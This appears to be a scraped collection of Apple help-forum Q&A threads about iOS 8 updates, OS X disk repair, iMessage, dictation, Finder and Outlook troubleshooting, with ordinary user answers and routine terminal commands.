To delete it, you have to delete the application that provides it.\n", "Q: iPad Mini stuck in iTunes logo (failed upgrade) I tried to update to iOS 8 today, and when I opened iTunes to do so, it also requested to update itself, as I thought it could handle both things (especially because I assumed it would update itself then, the iPad Mini). \nNow, the iPad is stuck in a connect to iTunes mode, if I try to open the iTunes while the iPad is connect, the iTunes won't open and if I connect it after the iPad doesn't appear as a device in iTunes. \nIn the Device Manager it states that I have a unknown Device, and in Devices and Printers it is displayed as Apple Mobile Device USB Driver.\nHow can I get out of this mode and install the new OS ? I remember that when I had an iPhone 3g it could be done through getting the device into DFU. Is there an analog for it in iOS 7?\n\nA: I had the same problem this morning. I tried to update my ipad mini to iOS 8 over the air (without connecting it to my laptop and iTunes), and it got stuck on the apple logo bootup screen.\nThe workflow described on the following webpage enable me to resolve the situation: http://www.iphonehacks.com/2014/01/fix-stuck-apple-logo-evasi0n7.html\nHope it'll work for you as well! \n\nA: there. Your situation is indeed stuck in recovery mode while updating to the new iOS 8. And what you described indicates that iTunes can't recognize your phone. DFU mode can fix this but here i recommend a better and esaier way to fix this, that is to use a free program called ReiBoot.  The ever best one that is to fix this for me opinion. \n\nA: Just Connect Your iDevice to your PC and make sure iTunes shows up and then click \"Restore Ipad\" Then after the wait you should have a fully functional iDevice again!\n", "Q: Problems reinstalling OS X Mavericks on Macbook Pro (hard drive displays \"locked\" and I get \"live file system repair is not supported\" when repairing) I'm trying to fix someone's Macbook, and I am a Windows user so I'm having trouble confirming that his hard drive is ruined or unfixable which is what I think is the problem. \nWhen you boot it up it takes you to OS X Utilities, and when I try to press \"Reinstall OS X\", when prompted to select a disk to install OS X, the hard drive displays \"This disk is locked.\" When I go into disk utilities and try to repair disk, I eventually get \"live file system repair is not supported\"\nI assume this is a sign that the hard drive is failed and in need of replacement, but I'm looking to make sure there's nothing I can do to fix it. \nAlso, I know on Windows I could boot from a USB device or CD, (say I have Windows installed on a flash drive or a Ubuntu disk), and I'm wondering what my options are there if I don't want to just buy a new hard drive. I'd really like to be able to boot OS X from a flash drive and simply use that as the internal hard drive, is that at all possible? \n\nA: I recently had a similar issue. OS X has a \"safety\" feature where, if the system detects a problem with a volume, it can then set a flag in that drive's partition table that forces OS X to run \"fsck\" (a unix disk utility) on the volume before it can be mounted. \nWhat I have observed is that if you are booted into the Recovery partition of that machine (or also I would guess, an OS X install drive), the corrupted volume will appear as \"locked\", as you are seeing. I have even had OS X Disk Utility tell me that the volume had a \"hardware error\" when, in fact, it did not.\nNote that if you boot in target disk mode and attempt to mount the corrupt volume on another Mac, then what will happen (on 10.8.x or newer) is that instead of mounting the volume, OS X will run fsck in the background, although the user has no indication that is happening unless you look in Activity Monitor, and view All Processes (sort by CPU % for best results). Fsck can take its sweet time, 30-45 minutes on my 750 GB MacBook Pro! If you run Disk Utility or similar utilities like Disk Warrior during this time, since fsck is already running on that drive, then the other disk utility will report a hardware error, even though the hardware is fine. \nHowever if you wait until fsck stops running silently in the background, OS X will eventually mount the drive in read-only mode, which is what you have observed as the volume being \"locked\".\nWhat I did to fix it was boot the MacBook in target disk mode and connect it to my desktop Mac, then wait until fsck failed and the disk mounted as read-only. Then run TechTool Pro utility and scan for bad blocks, none found, hardware is perfect. Next run DiskWarrior and rebuild and replace the corrupt directory. Fixed. \nYou could also boot from a DiskWarrior recovery disk if you don't have another Mac. The TechTool Pro surface scan may be considered optional, unless you really want to rule out hardware failure.\nI have had two drives recently where the Console logs showed i/o errors and other issues that you would think meant hardware failure, but at the end of the day it was caused by old, incompatible 3rd-party software. In one case, it was Google Drive that caused it, in another, an outdated copy Symantec PGP WDE. I would check all your Library/LaunchDaemons and LaunchAgents and any StartupItems and Extensions and Spotlight Plugins on all systems and make sure there are no outdated things lurking around. Apple's last three major OS X releases have ever-tightening security and sandboxing that has wreaked absolute havok on low-level hardware-related third-party stuff.\n\nA: Start up the computer holding the option key, which takes you to the Startup manager; that will show you your boot options. It should show at least the recovery hd, possibly even the main drive. If the main drive is an option, select it, then before hitting enter, hold down both the Cmd key and the \"S\" key. That will boot you into single user mode, which should allow you to access the drive unhindered, outside of OS X.\nA black screen will appear, followed by a bunch of text. At the end of the scrolling, follow the instructions listed.\nAt the prompt type the following then hit enter:\n/sbin/fsck -fy\n\nIf there are errors, it will say the file system appears ok, but then there will be \"the file system has been modified\". If so, repeat the command until it just says the file system is ok.\nThen at the command prompt, run\n/sbin/mount -uw /\n\nThis mounts the root drive as writeable, and will remove damaged or unnecessary files. It may or may not tell you that some files have been removed. Regardless, at the next prompt, run reboot. Allow the system to restart unhindered. It may boot up into the main drive on its own then. If not, it will boot back into recovery, but you may have better luck in recovery now after repairing first in single user.\n\nA: Certainly you can use a USB with OS X on it to boot from it.\nYou will have to create it first.\nIf you have a DVD drive with OS X you can use it as well to boot from.\nBoot from (USB or DVD) can be activated with, pressing Option (alt) key during start up to select where to boot from.\nIf you are trying to repair the existing OS X on the HDD, then use the Internet Recovery option in the OSX Utilities. (cmd-r).\nTo check the hardware press \"D\" during start up, that should start the Apple Hardware test.\n\nA: make partition of your hard disk using disk utility and then try\n", "Q: iMessage stopped working.. Contacts are shown as red now This problem has been seen on mid-2012 MacBook Pros on Mavericks and on late-2014 Retina MacBook Pros on Yosemite.\nOne day while using iMessage on the Mac, all the contacts turned red and messages failed to send, immediately returning a \"not delivered\" error. It also reported when trying to resend the messages that the contacts were no longer associated with an iMessage account.\nThings that didn't fix this behavior:\n\n\n*\n\n*Deleting the com.apple.ids.madrid\n\n*Removing the Apple ID information from my phone, turning off iMessage on both of the devices, and placing my iPhone in airplane mode for several minutes before turning it on logging in again.\nCould someone help me figure out how to solve this?\n\nA: One way you will get the red contacts is if the iMessages account is not enabled.\nGo to iMessages's preferences. And make sure the enabled check box is ticked.\nYou Will also get the red contacts if you are not signed in. \nIf that is the case you will need to sign in to see the enable check box.\n\n\nA: What I did that seems to have worked:\niOS Device > Settings > Messages > Text Message Forwarding\n\nTurned off the selection for my iMac & then turned it back on. Entered the code that showed up on my computer & all worked again.\n\nA: Go to System Preferences and iCloud, then click on Account Details to verify your connectivity to iCloud.\nIf you've got:\n\nAccount Details could not be opened because of an error connecting to iCloud.\n\nthen try to Sign Out and Sign In again. One of the reason could be that Apple recently tries to force and upgrade security for users to use Two-factor authentication.\nTo check the iCloud errors, run the following command in Terminal:\nlog stream | grep -i iCloud | grep -C5 -i error\n\n\nIf the problem is somewhere else, try running the following log command in Terminal to debug the problem:\nlog stream --predicate 'processImagePath contains \"Messages\"'\n\nor:\nlog stream | grep -C5 -w Messages\n\nor check in Console app, then re-send the message and check for any hints or errors.\n\nA: try to change your apple id to a new one just for imessage. i have the same problem as yours, icloud is all working thru mac and idevices. facetime also works with old apple id. only messages in mac ( seems cannot connect to the server or something is wrong with the appleid for messages server) and in my iphone, everytime i try to re-loggin again my old appleid, it sends messages and receive messages from anyone, i can send imessage to myself, only when i try to send imessage to my appleid(email add) it says delivered but i cannot get it back from my phone. same also with my mac. if my old appleid was logged in, all my contacts as red, but when i try to send a message to myself, i can receive it, but i cannot send to anyone. so what i did was use a new apple id specific for imessage only. both mac and iphone are working... messages are sync. :-)\n\nA: I hope my encounter with Apple support helps.\nI had a couple things happen. When I registered my iPhone to send the code to my laptop, my Mac never received the code. I could send messages from my Mac to other iPhone users but not to Android users. In the end, the problem was all on the iPhone side of the equation.\nOn your iPhone, under Settings → Messages, you should see a box called Text Message Forwarding. Enable this setting. I had it disabled and tried to send the code, but my Mac never got the code. (Also enable Send as SMS, MMS Messaging and Group Messaging if you want these features). We also signed out and back into iCloud on my mac and that didn't help.\nI hooked my iPhone up to my Mac to back it up and left it plugged in the entire time we found the solution. (No idea if this had any impact.) \nOn the iPhone, we disabled restrictions found under Settings → General → Restrictions. Enable Handoff and Suggested Apps under Settings → General.\nHere is the odd part, the box called Text Message Forwarding had disappeared.  Text support wanted to wipe my iPhone. Instead we reset the network settings under Settings → General → Reset. Select Reset Network Settings. Once I did this, the Text Message Forwarding box re-appeared. Once activated, a code appeared on my Mac. At this moment, I don't know if Bluetooth was active or not but Wi-Fi was Off.\n", "Q: Does iPhone 5s slow down with iOS 8? I am pondering whether it makes sense to install iOS 8 on my iPhone 5s.  I've seen articles like this, that advise you not to install the new OS on the 4s.\nHowever, I've seen nothing about the 5s experiences.  Those with 5s phones upgraded... did the phone slow down at all?  Was it worth it?\n\nA: My 5s didn't slow down at all after the upgrade. I did disable a few features that annoyed me (quicktype prediction, spotlight suggestions, etc.) and you may want to if you're concerned about performance, but I didn't notice any speed issues at all. Much, much better than my experience with the beta on an iPod Touch. \n\nA: I've been running iOS 8 on a 5 since the first beta, and I've noticed no difference in normal use.  The only thing I can even think to comment on is that the boot time seems longer than before.\nSince it works so nicely on a 5, I can't imagine that you'd have an issues on a 5s.\n\nA: Unfortunately for me, I've been seeing slow response in certain apps after the upgrade. I cannot prove that it was due to iOS8 but I am seeing more of it than before.\nEdit: This issue will most likely occur until the app updates for iOS8, till then stability and bugs may occur. \n", "Q: How can I remove Emoji keyboard from iOS8? I updated my iPad to iOS8, and the Emoji keyboard suddenly appears although I have never set for it. How can I remove that? When I go to Settings:General:Keyboards, I see that Emoji is among the keyboards set, but I can't find a way to remove it.\n\nA: Settings → General → Keyboard → Keyboards. You'll see English and Emoji.\nOn the top right corner is the word Edit. Press Edit, and then tap the red button followed by Delete to remove the Emoji keyboard.\n", "Q: How can I downgrade mac to 10.9.4? I don't really like OS X 10.9.5, it has many problems with SelfControl, can I down grade it to 10.9.4?\nUpgrade:\nI can't install 10.9.4, here is the error message\n\n\nA: Generally speaking it is not possible to un-install a Mac O/S update. Actually there is nothing general about it at all, it's just not possible. Apple does not offer an uninstall option for O/S updates and patches. Or anything else for that matter.\nWhich means that any time you update your system you run the risk of obsoleting some software on your Mac.\nThere are a couple of ways to proceed, none of them are particularly good. You can contact the developer and see if there is an update on the way, or you can back-up your system, wipe the drive and re-install the operating system to the previous revision assuming you have the relevant installers and updaters. If you clone your drive all you have to do is re-install the O/S, the migration assistant will then copy your files and Apps from the clone.\nPersonally I recommend anyone wait before applying any O/S update to verify their critical apps work with it. There is no real benefit to being the first to apply an update. Conversely there are multiple benefits to waiting. Not the least of which is letting everyone else be your beta testers. \nI also recommend you use something like Carbon Copy Cloner or Super Duper to clone the entire HD **before* any O/S upgrades. Yeah it's a PITA but allows you to \"revert\" an upgrade if it breaks something.\n", "Q: Continuity/Handoff Issue I upgraded my iPhone 5S and my iPad (Model #MC769LL/A) to the iOS 8 operating system.  Both are on the the same WiFi network. Bluetooth is on on both devices.  The iPhone Handoff app setting is on, but not found in iPad settings.  I am able to answer phone call on iPad and use iPad to make a call via the phone.  However, I cannot handoff from one device to another when using Pages, Mail, Numbers, etc.  There is no activity app icon in the lower left corner of the locked screen on either device.  What is wrong?\n\nA: Be sure that the two devices are connected via wifi and bluetooth. If Bluetooth has lost the link, go into settings and find the other device, touch 'connect'. Check both ways. \nI am not sure if handoff will work on your iPad. At least update to the latest systems. Good luck!\n\nA: From googling it looks like iPad model MC769LL/A is an iPad 2nd generation, which unfortunately does not support Handoff nor AirDrop.\n", "Q: Import existing data into iOS 8 Health Is it (or will it be) possible to import data already collected by other apps into the new health app in iOS 8?\n\nA: We recently released a new app that is dedicated to importing data from CSV (comma separated value) data files which covers many formats of exported data from existing apps.  It will allow you to import data from apps that have an export feature, but are not yet integrated into HealthKit / Health App.  \nIf this is a feature you are still curious about, please check it out on the App Store at:  https://itunes.apple.com/us/app/health-importer/id930943780?ls=1&mt=8\n\nA: As xVir said in the comment, it will depend on the apps and not on Health.\nAfter Health has been released, several of the apps I used were updated to support Health.\nSome of them just said that they would push data in Health from now on (like Sleep Time), and others took the data they already had created to push it to Health (like FitStar).\nSo, it's up to the app developer to decide if he implements a way to push to Health the old data the app already created, or only the newly created data.\nYou can see Health as a \"passive\" data repository of health information which will be provided by 3rd party apps (or manually). It will then \"just\" draw charts out of it.\nSo follow xVir advice and ask the providers of apps. I did it with Sleep Time for example, where I would like to get several months of data in Health (but no answer for now... Just answered that they are looking into it for a future update)\n", "Q: How can I back up apps which are no longer available? I have an old iPhone 3G I'd like to repurpose.  I've got some apps on it which work fine, but the current versions in the App Store won't run on a device this old.  How can I back up the phone and the apps on it in such a way that I can restore and continue using those apps?\n\nA: I eventually figured out a solution.  iTunes has an option to back up apps from the phone, which is called \"Transfer Purchases\".  It moves around in every version of iTunes, but it should be there.  Because I was using an iTunes installation associated with a newer iPhone as well, I had newer, incompatible versions of apps already downloaded, so transferring would not overwrite them with an older version.\nIn order to transfer the apps, I created a new user account on my mac, authorized it with my apple id, and then I was able to transfer purchases off the iPhone 3G to this new account.  To be safe, I then copied the files out of the iTunes Media folder, just to ensure that I won't accidentally do something in iTunes to destroy these files.\n", "Q: Xls to csv - Numbers creates multiple csv files for some reason I have a small xls file which 200Kb of size. When I export it to csv format, Numbers creates multiple csv files. How do I make it create a single one?\n\nA: CSV are simple text file where the data are only separated by comas and new lines. \nThere is no concept of sheets therefore Numbers need to create a csv for each sheet. \n", "Q: How to mass delete your photos in your iPhone? I cannot do it in the phone itself, neither in iPhoto.\nHow can you delete all your photos in iPhone?\n\nA: From http://www.idownloadblog.com/2014/02/28/how-to-delete-photos-from-your-iphone/\nHow to delete all photos from iPhone\nThe following method is without a doubt the fastest and most efficient way to mass delete photos from your Camera Roll. You can choose to delete one or hundreds of photos at once, and get the job done in less time that it takes to say it.\n1) Plug your iPhone in your Mac. Launch the application called Image Capture. You might not have heard of it before, but it comes with all Macs. It should be somewhere in your Applications folder.\nNote to Windows users: I do not have a Windows machine to test this on, but if my memory is correct, you can achieve the same thing by going to “My Computer” and look for your iPhone, which should appear as cameras normally do on PC. Don’t quote me on this though. Hopefully, some commenters that have a Windows PC will be able to give us more details about that.\n2) Make sure your iPhone or iPad is selected from the “Devices” list in the left navigation bar.\n3) Select as many photos as you want to delete. If you want to delete all of them in one scoop, hit the “Command + A” keys on your keyboard to select all photos.\n4) Click on the red delete icon at the bottom of the screen.\n5) You will get one last chance to stop the mass removal of your pictures. Image Capture will ask you if you’re sure you want to delete the selected items permanently. Click Delete. All the photos will be wiped from your iPhone or iPad.\n", "Q: How to change the input source to different language with shortcut (only one key combination)? I want to use four language in my OS X system (English, Spanish, Chinese, and Japanese), and I know I can change the language with ⌘ + Space. However, I have a pathological hatred for switching with it, because it requires me to select from so, so many choices! I also know I can change it from the menubar on the right of the bar, but it's much more disgusting than the ⌘ + Space solution.\nSo I rather want to change it with easier shortcut, like the following:\n\n\n*\n\n*left ⌘ switches to English\n\n*right ⌘ switches to Spanish\n\n*left ⌘ + left ⌥ + C switches to Chinese\n\n*right ⌘ + right ⌥ + C switches to Japanese.\n\n\nI tried to use Karabiner (the descendent from KeyRemap4MacBook), but it doesn't work on the first attempt on Chinese, on which when I switches to Chinese, it remains English (the input source icon on the menubar changes, but the keyboard does not work). But for some reasons if I switch from English to Chinese to English to Chinese (two attempts), then the Chinese keyboard finally works.\nSo I don't like the idea of using Karabiner. So what is the better way to change the input source?\n\nA: I ran into the same issue with Chinese and Japanese.

How can I configure OS X to allow audio playback while I use voice-to-text?\n--\nAs empowered as my MacBook makes me [feel], an important part of my personality is indefinitely numb from familiarity with a feeling the still hopeful ones of us will also integrate into their being eventually: devastation that \"no, you can't.\" is literally the  correct answer to their Apple-related how-to question.\n... so, with carefully managed expectations, I await ...\n\nA: Run these two commands in terminal.\ndefaults write com.apple.SpeechRecognitionCore AllowAudioDucking -bool NO\ndefaults write com.apple.speech.recognition.AppleSpeechRecognition.prefs DictationIMAllowAudioDucking -bool NO\n\nThen restart Dictation.\n\nA: You can't.  But you can request the feature.\nIt's my understanding that processing your voice into text is much harder, the more background noise there is.  While your Macbook (or iMac, or whatever) has no control over noisy people sitting near to you, or a TV in the background etc, it does have control over the noises it emits, and as such does what it can to ensure optimal listening to the best of it's ability.\nThat's not to say it can't be done, but this is certainly how Apple have implemented it.  You might want to look into 3rd party dictation software if the built in tools do not do what you require.  You need to carefully consider the pros and cons of how important dicatation is to you, is it worth the hassle of it pausing your audio when you speak, or is paying upwards of $200 which is the cost of even basic 3rd party software value for your specific needs.\nOSX, and indeed Apple products in general do a lot of things, especially for the price, but they are not in the business of making best of class apps free to users by bundling them in with the OS.  They provided dictation, but you may want more, and 3rd party ecosystem delivers on that.  They provide basic tools for notes, reminders, read-later software and so on, but non of these are as good as (for example) Things, or EverNote, or Instapaper and so on.  They show you what you can do, it may be enough for most, if not see how other people can expand on the basic offering for improved features.\nThink not \"Can I do this with free Apple software without having to spend money to achieve my specific requirements\", but \"Can this be done, and what might I need to purchase to enable it\"\n", "Q: iMessage prompt on iMac start up Every time I turn my iMac desktop on, I'm prompted to sign into iMessage.

Then you should be able to create one for yourself.\nRight now you're using someone else's iCloud accounts. Why they didn't erase the iPad before handing it off is anyone's guess, but it wasn't smart on their part. They may have \"moved on\" with regards to the iPad you have, but they could still be using their iCloud accounts on other devices. That could get into theft, invasion of privacy, etc.\nWhat you want to do, and what you'll need to do, is factory reset the iPad, then set up your own iCloud account during initialization. Yes, this will mean you will lose everything that was on there, but it really wasn't licensed to you to begin with. See this Apple Support Article for details.\n\nA: The answer is it really depends on how and why you are rotating several accounts through one piece of hardware.\nFor example:\n\n\n*\n\n*Are you using an institutional email address (or something other than mac.com/me.com/icloud.com) for these Apple ID? The avenues for institutional management of Apple ID depends on your situation so there's no general purpose answer.\n\n*Have you engaged your Apple Sales support yet? (for they surely can advise you on the benefits of one avenue versus another for your particular situation and location in the world as not all countries have the same online capabilities with respect to AppleID and iCloud.)\nWithout knowing the use case and larger picture, you are left with basic consumer actions like creating accounts on Mac and/or purchasing more iOS devices if you really need to sow more iCloud accounts due to harvesting older ones.\n\nA: You can make the accounts at appleid.apple.com . That should avoid any issue with making too many from someone else's device.\n", "Q: How can I convince iPhone that phone calls are just not that important?

I also see the shared reminders and calendar. Also, her devices show up in my Find my iPhone. \nWhat doesn't show up is purchases. If I go to iTunes or to the App Store, under purchased, I do not see her, nor any area for family purchases. It looks as it always has. \nWe have two totally separate iTunes accounts, always have. \nAlso, as a note - I have gone through everything on Apple's support page (http://support.apple.com/kb/TS5449) and no changes. Basically, it notes to make sure you are logged into the right accounts, everyone is set up to share, and the apps support it. \n\nA: Download a new free app & see if it jogs the server.\nFrom http://appleinsider.com/articles/14/09/18/how-to-start-an-ios-8-family-sharing-account-to-share-apps-music-movies-more\n\nA: Same thing happened to me.

I need to simply run sudo updatedb, except usracc is not in the sudoers list.\nOk, I say and su adm then sudo updatedb which tells me that updatedb command is not found. So to recap:\n\n\n*\n\n*my regular user account is not on the sudoers list (this is actually intentional, as I dont want to compromise the system if the password for this account is compromised). \n\n*my admin account can sudo but apparently not that particular command, which cannot be found for whatever reason. \n\n*when I su to my admin account I see; shell-init: error retrieving current directory: getcwd: cannot access parent directories: Permission denied which gets repeated everytime I try to get content assist with the tab key..\nso with the root account disabled, apple sort of forces you to give sudo privilages to user accounts to be able to do simple stuff, how exactly does that help with security? Or have I completely misunderstood something here?\n\nA: You aren't carrying forward your shell environment into the su adm session. so if you echo $PATH in the usracc account and the adm account, you'll find that they aren't equal (which is why adm can't find the updatedb command). All you need to do is tell su that you want to carry forward your env (su -m adm should do it) or just add the path to updatedb.\nThough on my box updatedb is called /usr/libexec/locate.updatedb and is a script.\n", "Q: Using an iMac as external monitor for my mid 2009 13'' MacBook Pro Here's my MacBook:\nhttp://www.everymac.com/systems/apple/macbook_pro/specs/macbook-pro-core-2-duo-2.53-aluminum-13-mid-2009-sd-firewire-800-unibody-specs.html\nHere's the iMac:\nhttp://www.everymac.com/systems/apple/imac/specs/imac-core-i5-3.2-27-inch-aluminum-late-2012-specs.html\nBasically, my MBP has one Mini DisplayPort and the iMac has multiple thunderbolt ports.

So I went into Settings -> General -> Reset, and I picked the option to reset all content and settings. However it's been stuck at a screen with a loading spinner for about 5 hours now. How long should I expect this process to take? \n\nA: It sounds like something's gone wrong with the reset process, but you should be able to recover the phone without too much trouble.\nFirst, open iTunes and connect the phone to your computer. If the phone appears in iTunes without displaying any error messages then you should be able to restore it from the iTunes interface.\nIf the above doesn't work you can force the device to turn off by holding down the Power and Home buttons until the screen cuts out. At this point you should be able to turn it back on and (at the very least) restore the device via iTunes.\nIf that doesn't work, try putting the device into DFU mode:\n\n\n*\n\n*Turn off the device (if it isn't off already) by holding down the Power and Home buttons until the screen goes blank.\n\n*Hold the Power button for 3 seconds\n\n*Hold Home button without letting go of the Power button, then wait 10 seconds.\n\n*Keep holding Home and let go of Power. Wait about 15 seconds just to be sure.\n\n\n(Source for the above: https://discussions.apple.com/thread/5409794)\nFrom there the device will appear non-functional but you should have no problems restoring from iTunes.\n", "Q: Keyboard shortcut for Sort By Date Created As there’s not one built-in (see hold ⌥ ALT and navigate to Finder->View->Sort By), I tried to create a custom keyboard shortcut for Sort By Date Created in Finder (such as the built-in for Sort By Name ⌃ CTRL⌥ ALT⌘ CMD1). \nHowever, whichever keyboard combination I assign to it doesn’t work (i.e. ⌃ CTRL⌥ ALT⌘ CMD8, or ⌃ CTRL⌥ ALT⌘ CMD9, etc.)\nHow can I create a custom keyboard shortcut for Sort By Date Created?\n\nA: First make sure that date created is a visible column in list view in finder. You can do this by entering list view and right clicking the headers and checking date created. \nThen go to system preferences, keyboard, Shortcuts, and choose app shortcuts on the left. Then add a new shortcut for Finder by pressing the plus button and choosing finder from the drop down. In the menu title put \"Date Created\" exactly (without the quotes).

I have tried with a simple command:\ncd Name of the Folder\n\nbut it's not working, of course.\nI have also been searching on the web, but the methods I found are not actually working.\nHow can I accomplish this?\n\nA: The answers in the linked article are correct (but maybe hard to find among all the other information there). Key problem is that bash (and any other shell) use whitespace to separate between words, so any space characters within names (and any situations where such characters might occur) need to be protected/escaped.\ncd \"folder with whitespace in name\"\ncd folder\\ with\\ whitespace\\ in\\ name\n\nand (if you have the name of the folder in a variable)\nFOLDER_NAME=\"folder with whitespace in name\"\ncd \"$FOLDER_NAME\"\n\n\nA: To access files or directories that have spaces in them you have to tell Bash to ignore them (it uses spaces to delimit commands so it has to be told that the space in the file name is actually part of the filename)\nto do that you need to put a backslash (\\) in front of the space.\nie.\ncd Name\\ of\\ the\\ folder\n\nHowever bash will help: if you press the TAB key after the start of the filename it will autocomplete and take care of the spaces for you\nso type:\ncd Name Tab and it will autocomplete.\n\nA: After writing cd just press the Tab again and again until desired folder appers. Or first pass ls or dir to display all folders inside that folder, then write cd , write first word of your desired file name and start pressing Tab it will give you all the folders whose name starts with that particular word.\n", "Q: Battery life of macbook air with different hardware configuration Apple states that the 2014 11-inch MacBook Air has a battery life of 9 hours and the 13-inch model has a battery life of 12 hours.\nThese stats are for the default configuration:\n\n*\n\n*Processor: 1.4GHz dual-core Intel Core i5 (Turbo Boost up to 2.7GHz)\nwith 3MB shared L3 cache;\n\n*RAM: 4GB of 1600MHz LPDDR3 onboard memory;\n\n*Storage: 128 Gb or 256 Gb PCIe-based flash storage.\n\nMacBook Air can be upgraded though:\n\n*\n\n*Processor: configurable to 1.7GHz dual-core Intel Core i7 (Turbo\nBoost up to 3.3GHz) with 4MB shared L3 cache;\n\n\n*RAM: configurable to 8GB;\n\n\n*Storage: configurable to 512GB flash storage.\nI believe the component that has the biggest impact on battery life is the processor, though also RAM could affect battery life.

You need your data treated as separate series so that you can apply a color to each series. \nWith the chart selected, click the Edit Data References button that appears over the chart. Then, look in the lower, right-hand corner, there will be a little tiny slightly darker gray on light gray button labeled \"Plot Rows as Series\" (or \"Plot Columns as Series\"). Change this setting and you should have separate series for each of your data points, which will allow you to change their colors. \nNote that none of this is in the documentation.\nAs of Numbers 3.6 (possibly earlier), that's the lower left-hand corner.\n\n\nA: *\n\n*Select the chart.\n\n*Then Double click on the Bar you want to change.\n\n*Go to the Fomat Panel.\n\n*Use the Styles Tab to change the colour of the individual Bar\n\n\n\n\nA: I found this page to be helpful - I had wanted to color the bars for control cases differently than the normal ones.\n\nA: I hate to say this, but still have to say the previous answer is quite misleading, because it is only working if there is only 1 data point per series.\nI believe here the following is the real way of doing it correctly.\n1. split data by column (or transpose the table if you want)\n2. define each column as different series\n3. change gaps in order to optimize alignment (you may try different number, then you'll find the bars are not evenly distributed as 0% and 999% setting).\nScreenshot below for setting/format.\n\n\n\n", "Q: Gif player in iPad So I import gifs files from my PC to my iPad but it just frozen like a pic not moving, so what app can I use to play gifs in iPad I've tried some but they can't detect gifs from my iPad, the album shows 0 gifs meanwhile I have abt 200 gifs I've imported.\n\nA: If your iPad is jailbroken, you can install GIFViewer which will let you play GIFs in the iOS Photos app.\n", "Q: Make Home Directories Not Persist? We have a Macintosh being used by many people. They use Active Directory so they can get their own home directory in which documents can be cached, credentials are partitioned from other users, etc. The machine is running 10.9.\nThe problem is that they periodically get a keychain error, where they're not synced after changing on the AD server. I don't know if the problem originates with a dialog box not being checked or a communication issue between server and machine (although there shouldn't be any problem with that...implementation of keychain and AD integration?)\nWe tried a solution suggested by an Apple engineer; turn off mobile accounts, hoping that there wouldn't be a keychain issue if the home directory doesn't persist on the Mac (no keychain file, no complaints about incorrect password.) The on-site IT person said that in testing, it appears that the home directories still persist across logoffs and restarts.\nUsing a local login doesn't have the keychain issue, but then users will log in and download documents, keep themselves logged into services like email, etc, making it easy to leak data to different people.\nThe onsite person wants to run a periodic script that just deletes home directories or the keychain files, but I'm afraid this is more of a band-aid rather than a solution to the problem.\nAm I missing something with the not-creating-a-mobile-account settings to keep home directories from persisting? Or am I looking at the wrong approach to the problem? I'd prefer to have the OS solution rather than third party software if possible.\n\nA: have you tried a guest account?  perfect for kiosk-type walk up and walk away needs.\nthey dont' have full permissions, and all their files disappear at log out.\ndoes this sound like a  good fit?  in combination of a forced log out after x minutes idle.\nhttp://support.apple.com/kb/PH11186\n", "Q: How to get rid of iOS 7.x (downloaded but not installed) from 6.x As I've pointed it out in the question title, my 16 GiB iPhone 4s is getting out of memory due to the fact that it has self-downloaded iOS 7(.1.2) without I'd never asked for.\nAs long as it weights several GiB, there's any way to get rid of it ?\nI've tried to navigate the file system through an app (for OS X) called \"iFunBox\", but there's no way to locate it.\nThanks in advice!\n\nA: You cannot. iFunbox (or equivalent) will not have access to the root filesystem. You will need to jailbreak the device for this, and none exist for iOS 8 at this time.\nHowever, note that even if you do remove the update, iOS will still periodically check for it and redownload the firmware at a later date. You would need to prevent this and there does exist a tweak (read: hack) to accomplish this, but again, you would need to jailbreak the device.\n", "Q: How to forward iPhone SMS with original received/sent date stamps attached on iOS 6.1 I receive text messages on my iPhone.\nWhen I forward them, the original sender's contact info and date time stamp do not forward with it.\nIs there a way to include this information when forwarding to my email?\n\nA: sms will always have the time stamp from the time and sender of the message.  not the message you're quoting.\nif you want some evidence of timing etc, take a screen cap of original message and send that as an mms to the next person.  clunky, but might help\n", "Q: On iTunes 11.4 where do you change the default settings for Podcasts? I am using iTunes 11.4.x, and every time I add a new Podcast I have to change the settings.  Where can I change the default settings so any new podcasts I add will have the settings I want?\n\nA: There's a Default Settings link at the bottom of your list of Podcast subscriptions on the Podcasts page - you might have to scroll down the list to see it.\n", "Q: iOS 8 update fails with network connection time out I am attempting to update my iPod touch 5th generation to iOS 8 but I am unable to do so.\nWhen attempting to update over-the-air, I do not get very far into the updating process (still in the downloading phase) when a message pops up stating that the update failed (providing no reason).\nI have also tried to update through iTunes 11.4 on my computer, however a message pops up stating that the network connection has timed out.\nAre Apple's servers overwhelmed, or am I doing something wrong? I am unsure what to try next.\n\nA: One known condition for the install is that the device must have ~5GB free space for the temporary download of the installer file. You should delete unused apps, music and photos/movies from your iPod before you run the installation. The iPod should give you an error message saying the device doesn't have enough room.\n", "Q: Is there a way to order all the files and folders automatically? I am new to OS X, but there's one thing that annoys me a little bit, which is that every time I have to clean up all the files (by name, for example) because they are always pasted in an unordered way.\nI would not like to lose time to order them every time I change the content of the folders.\n\nA: Instead of using Clean Up By, use Arrange By. This both cleans up the layout and sets the default sort order for the folder for the future so that any modifications to the folder will update the sort order.\n", "Q: Outlook MEGA database I am the administrator of 10-15 computers, most of them Macs. One iMac Intel Dual Core, 3 GB of RAM (more than 3 y old) is running Outlook 2011 as an email client.\nThe problem is the Mac becomes unresponsive (beachball rolling and cannot do anything on computer) because the Outlook profile email database is 12 GB in size...\nI know, I have clean the deleted-spam-send folder, deleted everything... the 12 gig is the result of a cleanup because before it was 20 gig, this is a lot of email...\nAll email must be keep for references... now what i do, the computer cannot be used with outlook open... any idea ?\n\nA: Twelve GB isn't too massive for an Outlook:Mac 2011 database.  Personally, my Outlook database at work is 20GB.\nMake sure that your colleague isn't running out of disk space.  Outlook can have issues if there isn't sufficient hard disk space.  My rule of thumb is that I should always have a bare minimum of 10% of my disk free.  I'll also assume that you're up-to-date with both OS and Outlook updates.\nIf your colleague's Outlook content is exclusively stored in Exchange, an easy potential solution is to start afresh:\n\n\n*\n\n*Create a new user on their Mac.\n\n*Launch Outlook.\n\n*Enter their Exchange credentials.\n\n*Let Outlook download everything from Exchange.  \n\n\nSince your colleague's account is so large, I would start this on a wired connection at the end of the day.  If all goes well, everything will be downloaded by the following morning, and you can see if Outlook still has the same issues.\nThis will also work if your colleague's Outlook content is exclusively stored in IMAP/CalDAV/CardDAV.  It won't work if your colleague has local content or if they are using POP.\nIf your colleague's Outlook content isn't exclusively stored in Exchange, try the following options:\n\n\n*\n\n*Rebuild the Outlook database:\n\n\n*\n\n*Quit all running applications.\n\n*Copy the existing Identity to the desktop (or any other location you prefer).\n\n*Hold down the Option key, and launch Outlook.\n\n*The Microsoft Database Utility will launch.  Select the Identity file and and click the \"Rebuild\" button.\n\n*Outlook will create a new Identity file.  The new file might be smaller than the old one, since rebuilding the database cleans up quite a lot of things.  Launch Outlook with the new database and see if you still have 